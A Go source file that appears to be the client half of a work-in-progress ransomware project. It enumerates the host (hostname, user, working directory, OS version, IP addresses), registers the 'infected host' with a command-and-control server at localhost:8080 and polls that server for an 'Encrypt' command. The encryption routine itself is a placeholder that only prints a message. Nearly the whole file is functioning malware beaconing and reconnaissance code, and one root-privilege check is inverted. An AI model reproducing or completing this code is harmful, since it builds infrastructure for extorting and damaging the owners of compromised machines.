package main

import (
	"bytes"
	"crypto/sha1"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"time"
)

type Enumeration struct {
	ID       string   `json:"ID"`
	Hostname string   `json:"Hostname"`
	User     string   `json:"User"`
	IP       []string `json:"IP"`
	Pwd      string   `json:"Pwd"`
	OS       string   `json:"OS"`
}

var Discovery Enumeration

//Iniates first connection to the host
func main() {
	//test webserver is up and running
	resp, err := http.Get("http://localhost:8080/")

	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	if resp.StatusCode > 400 {
		//wait for web server to be running
		for x := 1; x < 100; x++ { //TODO: change to while loop
			time.Sleep(time.Minute)
			resp, _ := http.Get("http://localhost:8080/")
			if resp.StatusCode == 404 {
				continue
			} else {
				break
			}

		}
	}

	if resp != nil {
		//run Enumeration function and communicate this to C2
		Enumeration, userString := Enumerate()
		RegisterHost(Enumeration, userString)
	}
	//TODO: There should be something here

}

//Identifies a new infected host and registers it on the C2
func RegisterHost(Enumeration Enumeration, userString string) {
	postBody := Enumeration

	//convert struct to JSON
	var buf bytes.Buffer
	err := json.NewEncoder(&buf).Encode(postBody)
	if err != nil {
		log.Fatal(err)
	}
	client := &http.Client{
		Timeout: time.Second * 10,
	}
	//send the struct to the C2
	req, err := http.NewRequest(http.MethodPost, "http://localhost:8080/infected", &buf)
	if err != nil {
		panic(err)
	}
	//listen for response
	req.Header.Add("ID", userString)
	//https://golangbyexample.com/set-headers-http-request/
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	//TODO: Change this to response = 'WAIT', run the function again.
	if resp.StatusCode == 200 {
		for x := 1; x < 100; x++ { //TODO: change this to infinite loop after testing
			err := KeepAlive(userString)
			if err != nil {
				log.Fatalf("Can't reach server, error = %s", err)
				time.Sleep(time.Minute * 10)
			} else {
				break
			}
		}

	}
	defer req.Body.Close()
}

//Sends keep alive messages and checks for any commands
//Each client identified by ID in the header
func KeepAlive(userString string) error {
	client := &http.Client{
		Timeout: time.Second * 10,
	}
	req, err := http.NewRequest(http.MethodGet, "http://localhost:8080/commands", nil)
	if err != nil {
		return fmt.Errorf("error making KeepAlive connection: %s", err.Error())
	}
	req.Header.Add("ID", userString)

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error making KeepAlive connection: %s", err.Error())
	}

	bytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("error reading KeepAlive response: %s", err.Error())
	}

	command := string(bytes)
	if command == "Encrypt" {
		Encrypt()
	} else {
		time.Sleep(time.Minute * 10)
		KeepAlive(userString)
	}
	//return nill and close connection when have gotten the Encrypt command
	defer req.Body.Close()
	return nil
}

//Enumerates host machine, listens for command from C2
func Enumerate() (Discovery Enumeration, userString string) {
	//https://hack.technoherder.com/linux-host-enumeration/

	//Get hostname
	Hostname, err := os.Hostname()
	if err != nil {
		Discovery.Hostname = "Error getting hostname"
	} else {
		Discovery.Hostname = Hostname
	}
	//Get username
	username, err := user.Current()
	if err != nil {
		Discovery.User = "Error getting username"
	} else {
		if os.Getuid() != 0 {
			Discovery.User = "Root"
		} else {
			Discovery.User = username.Username + " (not Root)"
		}

	}

	//get pwd
	pwd, err := os.Getwd()
	if err != nil {
		Discovery.Pwd = "Error getting pwd"
	}
	Discovery.Pwd = pwd

	//get OS and version
	//TODO: Make this compatible with Windows
	//https://github.com/matishsiao/goInfo
	cmd := exec.Command("uname", "-sr")
	var out bytes.Buffer
	cmd.Stdout = &out
	err = cmd.Run()
	if err != nil {
		Discovery.OS = err.Error()
	} else {
		Discovery.OS = out.String()
	}

	//Get local IP address
	var addresses []string
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		Discovery.IP = append(addresses, "Error getting IP address")
	} else {
		for _, addr := range addrs {
			address := fmt.Sprint(addr)
			addresses = append(addresses, address)
		}
		Discovery.IP = addresses
	}

	//register an ID
	// ID = hash of OS + Kernal + hostname
	ID := strings.TrimSuffix(out.String(), "\n") + " " + Hostname
	hash := sha1.Sum([]byte(ID))

	ID = fmt.Sprintf("%x", hash)
	userString = ID
	Discovery.ID = ID

	return Discovery, userString
}

//trigger key creation serverside and download the encryption binary from /file
func Encrypt() {
	//placeholder code
	fmt.Println("I would start encrypting")
	time.Sleep(time.Second * 10)
	os.Exit(1)
}
